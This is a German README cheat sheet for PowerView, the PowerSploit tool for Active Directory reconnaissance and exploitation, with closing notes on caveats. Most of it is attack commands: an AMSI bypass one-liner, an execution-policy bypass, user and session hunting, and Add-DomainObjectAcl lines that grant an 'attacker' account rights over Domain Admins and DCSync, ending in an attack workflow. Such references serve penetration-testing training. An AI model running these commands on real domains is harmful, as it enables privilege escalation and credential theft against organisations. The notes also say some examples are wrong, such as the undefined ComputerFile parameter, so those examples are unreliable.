# ⚡ PowerView – AD-Bestandsaufnahme mit PowerShell

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  Active-Directory-Aufklärung mit PowerShell
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 Inhaltsverzeichnis

- [Was ist PowerView?](#-was-ist-powerview)
- [Einrichtung](#-einrichtung)
- [Domäne erfassen](#-domäne-erfassen)
- [Benutzer erfassen](#-benutzer-erfassen)
- [Gruppen erfassen](#-gruppen-erfassen)
- [Computer erfassen](#-computer-erfassen)
- [Zugriffslisten erfassen](#-zugriffslisten-erfassen)
- [Vertrauensbeziehungen erfassen](#-vertrauensbeziehungen-erfassen)
- [Gruppenrichtlinien erfassen](#-gruppenrichtlinien-erfassen)
- [Benutzer und Zugriffsrechte aufspüren](#-benutzer-und-zugriffsrechte-aufspüren)
- [Schnellübersicht](#-schnellübersicht)

---

## 🎯 Was ist PowerView?

**PowerView** ist ein PowerShell-Werkzeug zum Erfassen und Ausnutzen von Active-Directory-Umgebungen (AD). ACLs sind Zugriffslisten, GPOs Gruppenrichtlinienobjekte. Es unterstützt:

- 🔍 **Bestandsaufnahme** – Benutzer, Gruppen, Computer und GPOs
- 🔐 **Zugriffslisten** – Fehlerhaft konfigurierte Berechtigungen finden
- 🌐 **Trusts** (Vertrauensbeziehungen) – Beziehungen zwischen Domänen abbilden
- 🎯 **Hunting** (gezielte Suche) – Anmeldeorte von Benutzern finden

---

## 🚀 Einrichtung

### PowerView herunterladen

```powershell
# Aus PowerSploit
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Aus SharpHound
# PowerView.ps1 ist in BloodHound enthalten
```

### Modul importieren

```powershell
# Ausführungsrichtlinie umgehen
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Importieren
Import-Module .\PowerView.ps1

# Alternativ per Dot-Sourcing laden
. .\PowerView.ps1
```

### AMSI umgehen (falls erforderlich)

```powershell
# Einfache Umgehung
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Domäne erfassen

### Grundlegende Domäneninformationen

```powershell
# Domäneninformationen abrufen
Get-Domain

# Domänen-SID abrufen
Get-DomainSID

# Domänenrichtlinie abrufen
Get-DomainPolicy

# Domänencontroller abrufen
Get-DomainController
Get-DomainController -Domain other.domain.local

# Gesamtstrukturinformationen abrufen
Get-Forest
Get-ForestDomain
```

### Domänenrichtlinie

```powershell
# Passwortrichtlinie
(Get-DomainPolicy)."SystemAccess"

# Kerberos-Richtlinie
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Benutzer erfassen

### Benutzer auflisten

```powershell
# Alle Benutzer
Get-DomainUser

# Bestimmter Benutzer
Get-DomainUser -Identity admin

# Benutzereigenschaften
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Benutzer mit Beschreibung
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### Interessante Benutzer finden

```powershell
# Benutzer mit SPN (für Kerberoasting geeignet)
Get-DomainUser -SPN

# Benutzer ohne Vorauthentifizierung (AS-REP)
Get-DomainUser -PreauthNotRequired

# Benutzer mit AdminCount (geschützt)
Get-DomainUser -AdminCount

# Benutzer mit Passwörtern in der Beschreibung
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Benutzersitzungen

```powershell
# Wo ist der Benutzer angemeldet?
Find-DomainUserLocation -UserIdentity admin

# Benutzer mit Administratorzugriff finden
Find-LocalAdminAccess
```

---

## 👥 Gruppen erfassen

### Gruppen auflisten

```powershell
# Alle Gruppen
Get-DomainGroup

# Bestimmte Gruppe
Get-DomainGroup -Identity "Domain Admins"

# Gruppenmitglieder
Get-DomainGroupMember -Identity "Domain Admins"

# Mitglieder rekursiv erfassen
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Wichtige Gruppen

```powershell
# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Gruppen eines Benutzers finden
Get-DomainGroup -UserName admin
```

### Lokale Gruppen

```powershell
# Lokale Administratoren eines Computers
Get-NetLocalGroupMember -ComputerName server01

# Lokale Administratoren auf allen Zielcomputern
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Computer erfassen

### Computer auflisten

```powershell
# Alle Computer
Get-DomainComputer

# Bestimmter Computer
Get-DomainComputer -Identity server01

# Eigenschaften
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Computer mit uneingeschränkter Delegierung
Get-DomainComputer -Unconstrained
```

### Ziele finden

```powershell
# Domänencontroller
Get-DomainController

# Server
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Altes Betriebssystem
Get-DomainComputer -OperatingSystem "*2008*"
```

### Freigaben

```powershell
# Freigaben finden
Find-DomainShare

# Beschreibbare Freigaben
Find-DomainShare -CheckShareAccess

# Interessante Dateien in Freigaben
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 Zugriffslisten erfassen

### Grundlegende Zugriffslisten

```powershell
# Zugriffsliste eines Benutzers
Get-DomainObjectAcl -Identity admin

# GUIDs auflösen
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Bestimmte Rechte
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### Interessante Zugriffslisten finden

```powershell
# GenericAll auf einem Benutzerobjekt
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### DCSync-Rechte

```powershell
# DCSync-Rechte finden
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### Zugriffsliste ändern

```powershell
# GenericAll für einen Benutzer hinzufügen
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# DCSync-Rechte hinzufügen
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Vertrauensbeziehungen erfassen

### Vertrauensbeziehungen zwischen Domänen

```powershell
# Vertrauensbeziehungen abrufen
Get-DomainTrust

# Alle Vertrauensbeziehungen
Get-DomainTrust -Domain domain.local

# Alle Vertrauensbeziehungen abbilden
Get-DomainTrustMapping
```

### Vertrauensbeziehungen zwischen Gesamtstrukturen

```powershell
# Vertrauensbeziehungen der Gesamtstruktur
Get-ForestTrust

# Domänen der Gesamtstruktur
Get-ForestDomain
```

### Arten von Vertrauensbeziehungen

| Vertrauensbeziehung | Richtung | Beschreibung |
|------------|-----------|-------------|
| Bidirektional | Beidseitig | Beide Domänen vertrauen einander |
| Eingehend | Einseitig | Die andere Domäne vertraut uns |
| Ausgehend | Einseitig | Wir vertrauen der anderen Domäne |

---

## 📜 Gruppenrichtlinien erfassen

### Gruppenrichtlinien auflisten

```powershell
# Alle Gruppenrichtlinien
Get-DomainGPO

# GPO anhand des Namens
Get-DomainGPO -Identity "Default Domain Policy"

# GPOs für eine bestimmte Organisationseinheit (OU)
Get-DomainGPO -ComputerIdentity server01
```

### GPO-Berechtigungen finden

```powershell
# GPO, die ein Benutzer ändern kann
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### GPO-Verknüpfungen

```powershell
# OUs, für die eine GPO gilt
Get-DomainOU -GPLink "{GPO-GUID}"

# GPO für einen bestimmten Computer
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Benutzer und Zugriffsrechte aufspüren

### Administratorzugriff finden

```powershell
# Wo haben wir lokale Administratorrechte?
Find-LocalAdminAccess

# Mit mehreren Threads
Find-LocalAdminAccess -Threads 10

# Auf bestimmten Computern
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Benutzerstandorte finden

```powershell
# Wo ist der Benutzer angemeldet?
Find-DomainUserLocation

# Bestimmter Benutzer
Find-DomainUserLocation -UserIdentity admin

# Nur Computer, auf die Zugriff besteht
Find-DomainUserLocation -CheckAccess
```

### Sitzungen finden

```powershell
# Sitzungen auf einem Computer
Get-NetSession -ComputerName dc01

# Angemeldete Benutzer
Get-NetLoggedon -ComputerName server01

# RDP-Sitzungen
Get-NetRDPSession -ComputerName server01
```

### Bestimmte Benutzer aufspüren

```powershell
# Domänenadministratoren finden
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Prüfen, wo sie angemeldet sind
Invoke-UserHunter

# Unauffälligerer Modus
Invoke-UserHunter -Stealth
```

---

## 📊 Schnellübersicht

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `Get-Domain` | Domäneninformationen |
| `Get-DomainUser` | Benutzer auflisten |
| `Get-DomainGroup` | Gruppen auflisten |
| `Get-DomainComputer` | Computer auflisten |
| `Get-DomainController` | Domänencontroller auflisten |
| `Get-DomainTrust` | Vertrauensbeziehungen auflisten |
| `Get-DomainGPO` | Gruppenrichtlinien auflisten |
| `Find-LocalAdminAccess` | Administratorzugriff finden |
| `Find-DomainUserLocation` | Benutzersitzungen finden |

### Kerberos-Ziele

| Befehl | Beschreibung |
|---------|-------------|
| `Get-DomainUser -SPN` | Für Kerberoasting geeignete Benutzer |
| `Get-DomainUser -PreauthNotRequired` | Für AS-REP Roasting geeignete Benutzer |
| `Get-DomainComputer -Unconstrained` | Uneingeschränkte Delegierung |

### Häufige Filter

```powershell
# Nach Eigenschaft filtern
Get-DomainUser -Properties samaccountname,description

# LDAP-Filter
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Where-Bedingung
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Angriffsablauf

```powershell
# 1. Importieren
Import-Module .\PowerView.ps1

# 2. Domäne erfassen
Get-Domain
Get-DomainController

# 3. Benutzer finden
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Administratorzugriff finden
Find-LocalAdminAccess

# 5. Benutzer aufspüren
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. Zugriffslisten prüfen
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Ressourcen

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [PowerView-Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### Verwandte Cheatsheets
- [BloodHound](../../BloodHound/translations/README.de.md)
- [PowerShell](../../PowerShell/translations/README.de.md)
- [Mimikatz](../../Mimikatz/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Fassung und Optionen:** PowerSploit ist seit 2021 archiviert; die Beispiele sind versionsgebunden. Der geprüfte PowerView-Quellcode definiert Invoke-UserHunter als Alias von Find-DomainUserLocation. Der dortige Parameter ComputerName ist nicht mit dem im Beispiel verwendeten ComputerFile gleichzusetzen; ComputerFile ist in dieser Fassung nicht definiert. Auch die Behauptung einer allgemeinen Mitlieferung mit BloodHound ersetzt keine Prüfung des konkreten Pakets. [PowerSploit: Archivstatus](https://github.com/PowerShellMafia/PowerSploit), [PowerView: Funktionen und Aliasse](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
- **Ausführungsrichtlinie und AMSI:** Die Process-Ausführungsrichtlinie betrifft den aktuellen Prozess und kann durch Gruppenrichtlinien übersteuert werden. AMSI ist eine getrennte Schnittstelle für Sicherheitsprüfungen. Die historische Reflexionszeile ist daher keine allgemeine oder versionsunabhängig funktionierende Umgehung; sie bleibt unverändert als Originalbeispiel erhalten. [Microsoft: Set-ExecutionPolicy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy), [Microsoft: AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal).
- **Freigaben und Gruppenrichtlinien:** CheckShareAccess prüft laut PowerView Lesbarkeit, nicht Schreibbarkeit. ComputerIdentity bei Get-DomainGPO bezieht sich auf den angegebenen Computer, nicht direkt auf eine beliebige OU. Die GPO-ACL-Abfrage filtert zudem nicht auf den konkreten Benutzer und beweist keine effektiven Änderungsrechte. [PowerView: Funktionsdefinitionen](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
- **ACLs und DCSync:** Die gezeigten Muster liefern Kandidaten, keine vollständige Bewertung effektiver Rechte. Für die Replikation von Passwortdaten müssen die relevanten Rechte GetChanges und GetChangesAll am Domänenobjekt zusammen vorliegen; ein einzelner passender ACE-Text reicht nicht. Rechteänderungen benötigen selbst passende Berechtigungen. [SpecterOps: DCSync-Rechte](https://bloodhound.specterops.io/resources/edges/dc-sync).
- **Befunde und Reichweite:** adminCount zeigt an, dass ein Objekt wegen administrativer Gruppenmitgliedschaft geschützt wurde; es beweist keine aktuelle Administratorrolle. Beschreibungs-, SPN- und Sitzungsfunde sind ebenfalls keine Erfolgsgarantie. Die Hunting-Funktionen können entfernte Rechner aktiv kontaktieren; Ergebnisse hängen von Rechten und Erreichbarkeit ab. Stealth bedeutet keine Unsichtbarkeit. [Microsoft: adminCount](https://learn.microsoft.com/en-us/windows/win32/adschema/a-admincount), [PowerView: Erfassungsfunktionen](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).

---

<p align="center">
  <b>⚡ AD-Aufklärung mit PowerShell!</b><br>
  <i>PowerView – ein bewährtes Werkzeug zur AD-Bestandsaufnahme</i>
</p>
